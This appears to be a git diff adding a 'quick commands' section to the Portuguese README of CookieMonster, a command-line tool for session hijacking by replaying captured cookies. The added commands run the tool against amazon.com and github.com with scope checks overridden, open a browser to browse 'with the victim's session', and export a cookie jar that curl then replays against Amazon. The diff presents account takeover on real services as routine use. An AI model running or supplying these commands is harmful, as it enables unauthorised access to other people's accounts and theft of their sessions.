@@ -10,6 +10,23 @@ Validador de **session hijacking por cookie replay** — ferramenta CLI standalo
 
 > **Exemplo de uso:** quer conferir se os cookies capturados da Amazon ainda são funcionais. Executa o CookieMonster contra `amazon.com` e ele tenta reproduzir a sessão, reportando se o alvo reconheceu os cookies como uma sessão autenticada válida.
 
+**3 comandos rápidos** para casos comuns:
+
+```bash
+# Pipeline unificado (best + cookies + inject + check):
+python -m cookiemonster probe --domain amazon.com --allow-unsafe-scope
+
+# Abrir navegador headed para voce navegar com a sessao da vitima:
+python -m cookiemonster access --domain github.com --allow-unsafe-scope
+
+# Exportar cookie jar pronto para uso em curl/requests:
+python -m cookiemonster export-cookies --domain amazon.com -o amazon.txt
+curl -b amazon.txt https://www.amazon.com/
+
+# Resumo de todos os runs (com destaque de acessos confirmados):
+python -m cookiemonster dashboard
+```
+
 **Veja o [MANUAL completo](docs/MANUAL.md)** para instalação, workflow detalhado, exemplos práticos, troubleshooting e referência de comandos.
 
 ---
